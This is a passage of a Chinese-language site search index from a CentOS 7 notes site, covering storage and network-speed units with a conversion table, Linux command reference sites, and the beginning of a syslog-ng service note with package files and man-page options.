second\uff0c\u4e8c\u8fdb\u5236\u5146\u6bd4\u7279\u6bcf\u79d2\uff09\u6216\u8005 1.049 Mb/s\uff08megabit per second\uff0c\u5146\u6bd4\u7279\u6bcf\u79d2\uff09\uff0c\u5373\u53ef\u80fd\u8fbe\u5230\u7684\u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u5b9e\u9645\u4e0a\u4ec5\u4e3a 128 KiB/s\uff08kibibyte per second\uff0c\u4e8c\u8fdb\u5236\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u6216\u8005 131 kB/s\uff08kilobyte per second\uff0c\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u3002 \u7801\u7387\u5355\u4f4d - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \u8fd0\u8425\u5546\u5e38\u89c1\u7684\u5e26\u5bbd\u5355\u4f4d Mbps \u662fMegabit per second\u7684\u7f29\u5199\uff0c\u610f\u601d\u4e3a1,000,000\u4e2abits\u6bcf\u79d2\uff0c\u4ed6\u7684\u7b26\u53f7\u7f29\u5199\u4e3a Mbit/s or Mb/s \u3002\u7ef4\u57fa\u767e\u79d1\uff1a Data-rate units - Wikipedia MB/s \u662fMegabyte per second\u7684\u7b26\u53f7\u7f29\u5199\uff0cMBps\u4e3a\u5b83\u7684\u7f29\u5199\uff0c\u610f\u601d\u4e3a1,000,000\u4e2abyte\u6bcf\u79d2\u3002 \u56e0\u4e3a8\u4e2abit\u4e3a\u4e00\u4e2abyte\uff0c\u6240\u4ee5 1Mbps = 0.125MBps = 0.125MB/s MiB/s \u662f mebibyte per second \u7684\u7b26\u53f7\u7f29\u5199\uff0c\u610f\u601d\u662f 1,048,576\u4e2abyte\u6bcf\u79d2 1 Mbps = 0.125 MB/s = 0.1192 MiB/s 1,000,000 / 8 / 1,048,576 \u7ea6\u7b49\u4e8e 0.1192 \u8d34\u4e00\u5f20\u6362\u7b97\u56fe \u540d\u5b57 \u7b26\u53f7 bit \u6bcf\u79d2 byte \u6bcf\u79d2 bit per second bit/s 1 0.125 byte per second B/s 8 1 kilobit per second kbit/s 1,000 125 kibibit per second Kibit/s 1,024 128 kilobyte per second kB/s 8,000 1,000 kibibyte per second KiB/s 8,192 1,024 megabit per second Mbit/s 1,000,000 125,000 mebibit per second Mibit/s 1,048,576 131,072 megabyte per second MB/s 8,000,000 1,000,000 mebibyte per second MiB/s 8,388,608 1,048,576 gigabit per second Gbit/s 1,000,000,000 125,000,000 gibibit per second Gibit/s 1,073,741,824 134,217,728 gigabyte per second GB/s 8,000,000,000 1,000,000,000 gibibyte per second GiB/s 8,589,934,592 1,073,741,824 terabit per second Tbit/s 1,000,000,000,000 125,000,000,000 tebibit per second Tibit/s 1,099,511,627,776 137,438,953,472 terabyte per second TB/s 8,000,000,000,000 1,000,000,000,000 tebibyte per second TiB/s 8,796,093,022,208 1,099,511,627,776 \u6b64\u8868\u6e90\u4e8e \u56fd\u9645wiki\u767e\u79d1\uff1a Data-rate units - Wikipedia","title":"\u5404\u79cd\u8ba1\u7b97\u673a\u5b58\u50a8\u5355\u4f4d\u548c\u7f51\u901f\u5355\u4f4d"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_1","text":"","title":"\u5404\u79cd\u8ba1\u7b97\u673a\u5b58\u50a8\u5355\u4f4d\u548c\u7f51\u901f\u5355\u4f4d"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_2","text":"MiB \u662fMebibyte\u7684\u7f29\u5199\uff0c Mebibyte - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \uff0c1 MiB = 2\u768420\u6b21\u65b9 byte s = 1024 kibibyte s = 1048576bytes kibibyte KiB 2\u768410\u6b21\u65b9\u5b57\u8282 mebibyte MiB 2\u768420\u6b21\u65b9\u5b57\u8282 gibibyte GiB 2\u768430\u6b21\u65b9\u5b57\u8282 tebibyte TiB 2\u768440\u6b21\u65b9\u5b57\u8282 pebibyte PiB 2\u768450\u6b21\u65b9\u5b57\u8282 exbibyte EiB 2\u768460\u6b21\u65b9\u5b57\u8282 zebibyte ZiB 2\u768470\u6b21\u65b9\u5b57\u8282 yobibyte YiB 2\u768480\u6b21\u65b9\u5b57\u8282 MB \u662fMegabyte\u7684\u7f29\u5199\uff0c \u5146\u5b57\u8282 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \uff0c1MB = 1,000,000\uff0810\u76846\u6b21\u65b9\uff09 B \uff0c\u4e00\u767e\u4e07\u4e2abyte \u5343\u5b57\u8282 KB 10\u76843\u6b21\u65b9\u5b57\u8282 \u5146\u5b57\u8282 MB 10\u76846\u6b21\u65b9\u5b57\u8282 \u5409\u5b57\u8282 GB 10\u76849\u6b21\u65b9\u5b57\u8282 \u592a\u5b57\u8282 TB 10\u768412\u6b21\u65b9\u5b57\u8282 \u62cd\u5b57\u8282 PB 10\u768415\u6b21\u65b9\u5b57\u8282 \u827e\u5b57\u8282 EB 10\u768418\u6b21\u65b9\u5b57\u8282 \u6cfd\u5b57\u8282 ZB 10\u768421\u6b21\u65b9\u5b57\u8282 \u5c27\u5b57\u8282 YB 10\u768424\u6b21\u65b9\u5b57\u8282 \u5bb9\u5b57\u8282 RB 10\u768427\u6b21\u65b9\u5b57\u8282 \u6606\u5b57\u8282 QB 10\u768430\u6b21\u65b9\u5b57\u8282 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5355\u4f4d\u7f29\u5199\u4e2d\u95f4\u5e26i\uff0c\u76f8\u5dee1024\u500d\uff0c\u5355\u4f4d\u4e2d\u4e0d\u5e26i\u7684\uff0c\u76f8\u5dee1000\u500d \u56fd\u5185\u5f88\u591a\u7f51\u7ad9\u90fd\u4f1a\u628aMB\u5f53\u4f5cMiB\uff0c\u8d34\u4e00\u4e2a\u5728\u7ebf\u6362\u7b97\u5de5\u5177 \u5b57\u8282\u5355\u4f4d\u6362\u7b97\u5668_Gb,Kb,Mb\u5355\u4f4d\u6362\u7b97\u5de5\u5177 - \u7535\u5b50\u53d1\u70e7\u53cb(www.elecfans.com)","title":"\u9996\u5148\u8981\u641e\u61c2\u5404\u79cd\u5b58\u50a8\u5355\u4f4d"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_3","text":"","title":"\u7ecf\u5e38\u6df7\u6dc6\u7684\u4e24\u4e2a\u70b9"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#k-ki","text":"k \u4e0e Ki \u5206\u522b\u8868\u793a kilo-\uff08\u5343\uff09 \u4e0e kibi-\uff08\u4e8c\u8fdb\u5236\u5343\uff09 \u3002\u4f5c\u4e3a\u524d\u7f00\u4f7f\u7528\u65f6\uff0c k \u8868\u793a 1,000 \uff0cKi \u8868\u793a 1,024 \uff0c\u56e0\u4e3a\u201cKi\u201d\u6765\u6e90\u4e8e\u5b83\u5728\u8ba1\u7b97\u673a\u65b9\u9762 2\u768410\u6b21\u65b9 = 1,024 \u7684\u4f7f\u7528\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u4eba\u4eec\u5e38\u5e38\u9519\u8bef\u5730\u7528 K \u4ee3\u66ff Ki\u3002\u6b64\u5916\uff0c\u4e0d\u77e5\u6653\u5176\u4e2d\u5fae\u5999\u5dee\u522b\u7684\u5e7f\u5927\u516c\u4f17\uff0c\u5e38\u5e38\u4e0d\u52a0\u533a\u522b\u5730\u4f7f\u7528\u201cKbps\u201d\u4e0e\u201cKibps\u201d\uff0c\u9020\u6210\u4e86\u6df7\u4e71\u3002\u603b\u4e4b\uff0c\u4f7f\u7528\u201cKibps\u201d\u901a\u5e38\u662f\u6b63\u786e\u7684\u3002","title":"k \u4e0e Ki"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#b-b","text":"b \u4ee3\u8868 bit\uff08\u6bd4\u7279\uff09\uff0cB \u4ee3\u8868 byte\uff08\u5b57\u8282\uff09\uff0c1 \u5b57\u8282 \u5373 8 \u6bd4\u7279 \u3002\u8fd9\u4f1a\u5bfc\u81f4\u6df7\u6dc6\u3002\u6bd4\u5982\u5f53\u201c1M\uff081 Meg\uff0c1 \u5146\uff09\u7f51\u7edc\u8fde\u63a5\u201d\u5b57\u6837\u51fa\u73b0\u5728\u5e7f\u544a\u4e0a\u65f6\uff0c\u5b83\u5e38\u5e38\u8868\u793a 1 Mib/s\uff08mebibit per second\uff0c\u4e8c\u8fdb\u5236\u5146\u6bd4\u7279\u6bcf\u79d2\uff09\u6216\u8005 1.049 Mb/s\uff08megabit per second\uff0c\u5146\u6bd4\u7279\u6bcf\u79d2\uff09\uff0c\u5373\u53ef\u80fd\u8fbe\u5230\u7684\u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u5b9e\u9645\u4e0a\u4ec5\u4e3a 128 KiB/s\uff08kibibyte per second\uff0c\u4e8c\u8fdb\u5236\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u6216\u8005 131 kB/s\uff08kilobyte per second\uff0c\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u3002 \u7801\u7387\u5355\u4f4d - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"b \u4e0e B"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_4","text":"Mbps \u662fMegabit per second\u7684\u7f29\u5199\uff0c\u610f\u601d\u4e3a1,000,000\u4e2abits\u6bcf\u79d2\uff0c\u4ed6\u7684\u7b26\u53f7\u7f29\u5199\u4e3a Mbit/s or Mb/s \u3002\u7ef4\u57fa\u767e\u79d1\uff1a Data-rate units - Wikipedia MB/s \u662fMegabyte per second\u7684\u7b26\u53f7\u7f29\u5199\uff0cMBps\u4e3a\u5b83\u7684\u7f29\u5199\uff0c\u610f\u601d\u4e3a1,000,000\u4e2abyte\u6bcf\u79d2\u3002 \u56e0\u4e3a8\u4e2abit\u4e3a\u4e00\u4e2abyte\uff0c\u6240\u4ee5 1Mbps = 0.125MBps = 0.125MB/s MiB/s \u662f mebibyte per second \u7684\u7b26\u53f7\u7f29\u5199\uff0c\u610f\u601d\u662f 1,048,576\u4e2abyte\u6bcf\u79d2 1 Mbps = 0.125 MB/s = 0.1192 MiB/s 1,000,000 / 8 / 1,048,576 \u7ea6\u7b49\u4e8e 0.1192 \u8d34\u4e00\u5f20\u6362\u7b97\u56fe","title":"\u8fd0\u8425\u5546\u5e38\u89c1\u7684\u5e26\u5bbd\u5355\u4f4d"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_5","text":"\u540d\u5b57 \u7b26\u53f7 bit \u6bcf\u79d2 byte \u6bcf\u79d2 bit per second bit/s 1 0.125 byte per second B/s 8 1 kilobit per second kbit/s 1,000 125 kibibit per second Kibit/s 1,024 128 kilobyte per second kB/s 8,000 1,000 kibibyte per second KiB/s 8,192 1,024 megabit per second Mbit/s 1,000,000 125,000 mebibit per second Mibit/s 1,048,576 131,072 megabyte per second MB/s 8,000,000 1,000,000 mebibyte per second MiB/s 8,388,608 1,048,576 gigabit per second Gbit/s 1,000,000,000 125,000,000 gibibit per second Gibit/s 1,073,741,824 134,217,728 gigabyte per second GB/s 8,000,000,000 1,000,000,000 gibibyte per second GiB/s 8,589,934,592 1,073,741,824 terabit per second Tbit/s 1,000,000,000,000 125,000,000,000 tebibit per second Tibit/s 1,099,511,627,776 137,438,953,472 terabyte per second TB/s 8,000,000,000,000 1,000,000,000,000 tebibyte per second TiB/s 8,796,093,022,208 1,099,511,627,776","title":""},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/#_6","text":"\u6b64\u8868\u6e90\u4e8e \u56fd\u9645wiki\u767e\u79d1\uff1a Data-rate units - Wikipedia","title":""},{"location":"system/centos7/%E5%91%BD%E4%BB%A4%E6%90%9C%E7%B4%A2/","text":"\u63d0\u4f9blinux\u547d\u4ee4\u641c\u7d22\u7684\u7f51\u7ad9 \u4e2d\u6587\uff1a 1\u3001 Manpages of manpages-zh in Debian unstable \u2014 Debian Manpages \u6e90\u4ee3\u7801\uff1a man-pages-zh/manpages-zh: Chinese Manual Pages (github.com) 2\u3001 \u641c\u7d22 \u547d\u4ee4\uff0cLinux \u641c\u7d22 \u547d\u4ee4\u8be6\u89e3\uff1a\u6700\u4e13\u4e1a\u7684Linux\u547d\u4ee4\u5927\u5168\uff0c\u547d\u4ee4\u641c\u7d22\u5f15\u64ce\uff0c\u5185\u5bb9\u5305\u542bLinux\u547d\u4ee4\u624b\u518c\u3001\u8be6\u89e3\u3001\u5b66\u4e60\uff0c\u503c\u5f97\u6536\u85cf\u7684Linux\u547d\u4ee4\u901f\u67e5\u624b\u518c\u3002 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) \u6e90\u4ee3\u7801\uff1a GitHub - jaywcjlove/linux-command: Linux\u547d\u4ee4\u5927\u5168\u641c\u7d22\u5de5\u5177\uff0c\u5185\u5bb9\u5305\u542bLinux\u547d\u4ee4\u624b\u518c\u3001\u8be6\u89e3\u3001\u5b66\u4e60\u3001\u641c\u96c6\u3002https://git.io/linux 3\u3001 Linux\u547d\u4ee4\u5927\u5168(\u624b\u518c) \u2013 \u771f\u6b63\u597d\u7528\u7684Linux\u547d\u4ee4\u5728\u7ebf\u67e5\u8be2\u7f51\u7ad9 (linuxcool.com) 4\u3001 linux\u547d\u4ee4\u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) \u82f1\u6587\uff1a Linux man pages (die.net) Linux man pages online (man7.org) \u5185\u6838\u53c2\u6570\u67e5\u8be2\uff1a \u6587\u6863 /proc/sys \u2014 Linux \u5185\u6838\u6587\u6863 (kernel.org)","title":"\u63d0\u4f9b\u547d\u4ee4\u67e5\u8be2\u7684\u7f51\u7ad9"},{"location":"system/centos7/%E5%91%BD%E4%BB%A4%E6%90%9C%E7%B4%A2/#linux","text":"","title":"\u63d0\u4f9blinux\u547d\u4ee4\u641c\u7d22\u7684\u7f51\u7ad9"},{"location":"system/centos7/%E5%91%BD%E4%BB%A4%E6%90%9C%E7%B4%A2/#_1","text":"1\u3001 Manpages of manpages-zh in Debian unstable \u2014 Debian Manpages \u6e90\u4ee3\u7801\uff1a man-pages-zh/manpages-zh: Chinese Manual Pages (github.com) 2\u3001 \u641c\u7d22 \u547d\u4ee4\uff0cLinux \u641c\u7d22 \u547d\u4ee4\u8be6\u89e3\uff1a\u6700\u4e13\u4e1a\u7684Linux\u547d\u4ee4\u5927\u5168\uff0c\u547d\u4ee4\u641c\u7d22\u5f15\u64ce\uff0c\u5185\u5bb9\u5305\u542bLinux\u547d\u4ee4\u624b\u518c\u3001\u8be6\u89e3\u3001\u5b66\u4e60\uff0c\u503c\u5f97\u6536\u85cf\u7684Linux\u547d\u4ee4\u901f\u67e5\u624b\u518c\u3002 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) \u6e90\u4ee3\u7801\uff1a GitHub - jaywcjlove/linux-command: Linux\u547d\u4ee4\u5927\u5168\u641c\u7d22\u5de5\u5177\uff0c\u5185\u5bb9\u5305\u542bLinux\u547d\u4ee4\u624b\u518c\u3001\u8be6\u89e3\u3001\u5b66\u4e60\u3001\u641c\u96c6\u3002https://git.io/linux 3\u3001 Linux\u547d\u4ee4\u5927\u5168(\u624b\u518c) \u2013 \u771f\u6b63\u597d\u7528\u7684Linux\u547d\u4ee4\u5728\u7ebf\u67e5\u8be2\u7f51\u7ad9 (linuxcool.com) 4\u3001 linux\u547d\u4ee4\u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com)","title":"\u4e2d\u6587\uff1a"},{"location":"system/centos7/%E5%91%BD%E4%BB%A4%E6%90%9C%E7%B4%A2/#_2","text":"Linux man pages (die.net) Linux man pages online (man7.org) \u5185\u6838\u53c2\u6570\u67e5\u8be2\uff1a \u6587\u6863 /proc/sys \u2014 Linux \u5185\u6838\u6587\u6863 (kernel.org)","title":"\u82f1\u6587\uff1a"},{"location":"system/centos7/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%971/","text":"\u7cfb\u7edf\u65e5\u5fd7 syslog-ng \u670d\u52a1 \u7cfb\u7edf\u65e5\u5fd7\u670d\u52a1\u6bd4\u8f83\u5e38\u89c1\u7684\u6709\u4e09\u79cd\uff1asyslog\u3001rsyslog\u3001\u548csyslog-ng syslog\uff1a \u7cfb\u7edf\u65e5\u5fd7 - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u8bde\u751f\u4e8e1980\u5e74 rsyslog\uff1a Rsyslog - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e 2004 \u5e74 syslog-ng\uff1a syslog-ng - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e1998\u5e74 [root@VM-0-16-centos ~]# rpm -ql syslog-ng /etc/logrotate.d/syslog /etc/syslog-ng /etc/syslog-ng/conf.d /etc/syslog-ng/patterndb.d /etc/syslog-ng/scl.conf /etc/syslog-ng/syslog-ng.conf /usr/bin/loggen /usr/bin/pdbtool /usr/bin/update-patterndb /usr/lib/systemd/system/syslog-ng.service /usr/lib64/libsyslog-ng-3.5.6.so /usr/lib64/syslog-ng/libaffile.so /usr/lib64/syslog-ng/libafprog.so /usr/lib64/syslog-ng/libafsocket-notls.so /usr/lib64/syslog-ng/libafsocket-tls.so /usr/lib64/syslog-ng/libafsocket.so /usr/lib64/syslog-ng/libafstomp.so /usr/lib64/syslog-ng/libafuser.so /usr/lib64/syslog-ng/libbasicfuncs.so /usr/lib64/syslog-ng/libconfgen.so /usr/lib64/syslog-ng/libcryptofuncs.so /usr/lib64/syslog-ng/libcsvparser.so /usr/lib64/syslog-ng/libdbparser.so /usr/lib64/syslog-ng/liblinux-kmsg-format.so /usr/lib64/syslog-ng/libsyslogformat.so /usr/lib64/syslog-ng/libsystem-source.so /usr/sbin/syslog-ng /usr/sbin/syslog-ng-ctl /usr/share/doc/syslog-ng-3.5.6 /usr/share/doc/syslog-ng-3.5.6/AUTHORS /usr/share/doc/syslog-ng-3.5.6/COPYING /usr/share/doc/syslog-ng-3.5.6/NEWS /usr/share/doc/syslog-ng-3.5.6/bof-2002-09-27.txt /usr/share/doc/syslog-ng-3.5.6/dos-2000-11-22.txt /usr/share/doc/syslog-ng-3.5.6/relogger.pl /usr/share/doc/syslog-ng-3.5.6/syslog-ng.conf.doc /usr/share/doc/syslog-ng-3.5.6/syslog2ng /usr/share/man/man1/loggen.1.gz /usr/share/man/man1/pdbtool.1.gz /usr/share/man/man1/syslog-ng-ctl.1.gz /usr/share/man/man5/syslog-ng.conf.5.gz /usr/share/man/man8/syslog-ng.8.gz /usr/share/syslog-ng /usr/share/syslog-ng/include /usr/share/syslog-ng/include/scl /usr/share/syslog-ng/include/scl/pacct /usr/share/syslog-ng/include/scl/pacct/plugin.conf /usr/share/syslog-ng/include/scl/rewrite /usr/share/syslog-ng/include/scl/rewrite/cc-mask.conf /usr/share/syslog-ng/include/scl/syslogconf /usr/share/syslog-ng/include/scl/syslogconf/README /usr/share/syslog-ng/include/scl/syslogconf/convert-syslogconf.awk /usr/share/syslog-ng/include/scl/syslogconf/plugin.conf /usr/share/syslog-ng/include/scl/system /usr/share/syslog-ng/include/scl/system/plugin.conf /usr/share/syslog-ng/syslog-ng.vim /usr/share/syslog-ng/xsd /usr/share/syslog-ng/xsd/patterndb-1.xsd /usr/share/syslog-ng/xsd/patterndb-2.xsd /usr/share/syslog-ng/xsd/patterndb-3.xsd /usr/share/syslog-ng/xsd/patterndb-4.xsd /usr/share/vim /usr/share/vim/vim73 /usr/share/vim/vim73/syntax /usr/share/vim/vim73/syntax/syslog-ng.vim /var/lib/syslog-ng syslog-ng \u547d\u4ee4 \u540d\u79f0 syslog-ng - syslog-ng \u7cfb\u7edf\u8bb0\u5f55\u5668\u5e94\u7528\u7a0b\u5e8f \u7b80\u4ecb syslog-ng [options] \u63cf\u8ff0 \u672c\u624b\u518c\u9875\u4ec5\u4e3a\u6458\u8981\uff1b\u6709\u5173syslog ng\u7684\u5b8c\u6574\u6587\u6863\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b[1] \u6216 syslog ng\u5b98\u65b9\u7f51\u7ad9[2]\u3002 syslog ng OSE\u5e94\u7528\u7a0b\u5e8f\u662f\u4e00\u4e2a\u7075\u6d3b\u4e14\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684\u7cfb\u7edf\u65e5\u5fd7\u5e94\u7528\u7a0b\u5e8f\u3002\u901a\u5e38\uff0csyslog ng\u7528\u4e8e\u7ba1\u7406\u65e5\u5fd7\u6d88\u606f\u5e76\u5b9e\u73b0\u96c6\u4e2d\u5f0f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5176\u76ee\u7684\u662f\u5728\u5355\u4e2a\u4e2d\u592e\u65e5\u5fd7\u670d\u52a1\u5668\u4e0a\u6536\u96c6\u591a\u4e2a\u8bbe\u5907\u7684\u65e5\u5fd7\u6d88\u606f\u3002\u4e0d\u540c\u7684\u8bbe\u5907\uff08\u79f0\u4e3asyslog ng\u5ba2\u6237\u7aef\uff09\u90fd\u8fd0\u884csyslog ng\uff0c\u5e76\u4ece\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u3001\u6587\u4ef6\u548c\u5176\u4ed6\u6765\u6e90\u6536\u96c6\u65e5\u5fd7\u6d88\u606f\u3002\u5ba2\u6237\u7aef\u5c06\u6240\u6709\u91cd\u8981\u7684\u65e5\u5fd7\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0bsyslog ng\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5728\u90a3\u91cc\u5bf9\u5b83\u4eec\u8fdb\u884c\u6392\u5e8f\u548c\u5b58\u50a8\u3002 \u9009\u9879 --cfgfile <file> or -f <file> \u4f7f\u7528\u6307\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\u3002 --chroot <dir> or -C <dir> \u5c06\u6839\u76ee\u5f55\u66f4\u6539\u4e3a\u6307\u5b9a\u7684\u76ee\u5f55\u3002\u914d\u7f6e\u6587\u4ef6\u662f\u5728chroot\u4e4b\u540e\u8bfb\u53d6\u7684\uff0c\u56e0\u6b64\u914d\u7f6e\u6587\u4ef6\u5fc5\u987b\u5728chroot\u4e2d\u53ef\u7528\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd8\u53ef\u4ee5\u5728\u8bb0\u5f55\u4e4b\u540e\u91cd\u65b0\u52a0\u8f7dsyslog-ng\u914d\u7f6e\u3002\u4f46\u662f\uff0c\u8bf7\u6ce8\u610f\uff0c--user\u548c--group\u9009\u9879\u662f\u5728\u8bb0\u5f55\u4e4b\u524d\u89e3\u6790\u7684\u3002 --debug or -d \u5728\u8c03\u8bd5\u6a21\u5f0f\u4e0b\u542f\u52a8syslog ng\u3002 --default-modules \u81ea\u52a8\u52a0\u8f7d\u7684\u6a21\u5757\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002\u672a\u81ea\u52a8\u52a0\u8f7d\u7684\u6a21\u5757\u53ef\u4ee5\u901a\u8fc7\u5728syslog ng OSE\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b@module\uff1cmodulename\uff1e\u8bed\u53e5\u6765\u52a0\u8f7d\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u52a0\u8f7d\u4ee5\u4e0b\u6a21\u5757\uff1aaffile\u3001afprog\u3001afsocket\u3001afuser\u3001basicfuncs\u3001csvparser\u3001dbparser\u3001syslogformat\u3001afsql\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --enable-core \u542f\u7528syslog ng\u5728\u5d29\u6e83\u65f6\u5199\u5165\u6838\u5fc3\u6587\u4ef6\uff0c\u4ee5\u5e2e\u52a9\u652f\u6301\u548c\u8c03\u8bd5\u3002 --fd-limit <number> \u8bbe\u7f6e\u6240\u9700\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08fd-s\uff09\u7684\u6700\u5c0f\u6570\u91cf\uff1b\u8fd9\u8bbe\u7f6e\u4e86syslog ng\u53ef\u4ee5\u540c\u65f6\u6253\u5f00\u7684\u6587\u4ef6\u6570\u3002\u9ed8\u8ba4\u503c\uff1a4096\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e0d\u4f1a\u8986\u76d6\u4e3b\u673a\u7684\u5168\u5c40ulimit\u8bbe\u7f6e\u3002 --foreground or -F \u4e0d\u8981\u8fdb\u884c\u540e\u53f0\u5904\u7406\uff0c\u5728\u524d\u53f0\u8fd0\u884c\u3002 --group <group> or -g <group> \u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\u540e\u5207\u6362\u5230\u6307\u5b9a\u7684\u7ec4\u3002 --help or -h \u6253\u5370\u5e2e\u52a9\u4fe1\u606f --module-registry \u663e\u793a\u53ef\u7528\u6a21\u5757\u7684\u5217\u8868\u548c\u8bf4\u660e\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u4e9b\u6a21\u5757\u90fd\u662f\u81ea\u52a8\u52a0\u8f7d\u7684\uff0c\u53ea\u6709\u5728--default modules\u9009\u9879\u4e2d\u6307\u5b9a\u7684\u6a21\u5757\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --no-caps \u5728\u6ca1\u6709\u529f\u80fd\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5root\u8eab\u4efd\u8fd0\u884csyslog ng\u3002\u8fd9\u662f\u9ed8\u8ba4\u884c\u4e3a\u3002\u5728Linux\u4e0a\uff0c\u5982\u679csyslog ng\u662f\u5728\u542f\u7528--enable-Linux-caps\u9009\u9879\u7684\u60c5\u51b5\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u53ef\u4ee5\u4ee5\u975eroot\u8eab\u4efd\u8fd0\u884csyslog ng\u5e76\u63d0\u4f9b\u529f\u80fd\u652f\u6301\u3002\uff08\u6267\u884csyslog ng--version\u4ee5\u663e\u793a\u5df2\u542f\u7528\u7684\u751f\u6210\u53c2\u6570\u5217\u8868\u3002\uff09 --persist-file <persist-file> or -R <persist-file> \u8bbe\u7f6e\u5b58\u50a8\u6301\u4e45\u9009\u9879\u548c\u6570\u636e\u7684syslog-ng.persistent\u6587\u4ef6\u7684\u8def\u5f84\u548c\u540d\u79f0\u3002 --pidfile <pidfile> or -p <pidfile> \u8bbe\u7f6e\u5b58\u50a8\u4e3b\u8fdb\u7a0bPID\u7684PID\u6587\u4ef6\u7684\u8def\u5f84\u3002 --preprocess-into <output-file> \u5904\u7406\u5b8c\u914d\u7f6e\u6587\u4ef6\u5e76\u89e3\u6790\u4e86\u5305\u542b\u7684\u6587\u4ef6\u548c\u53d8\u91cf\u540e\uff0c\u5c06\u751f\u6210\u7684\u914d\u7f6e\u5199\u5165\u6307\u5b9a\u7684\u8f93\u51fa\u6587\u4ef6\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --process-mode <mode> \u8bbe\u7f6e\u5982\u4f55\u5728\u524d\u53f0\uff08\u4e3b\u8981\u7528\u4e8e\u8c03\u8bd5\uff09\u3001\u540e\u53f0\u4f5c\u4e3a\u540e\u53f0\u8fdb\u7a0b\u6216\u5b89\u5168\u540e\u53f0\u6a21\u5f0f\u4e0b\u8fd0\u884csyslog ng\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0csyslog 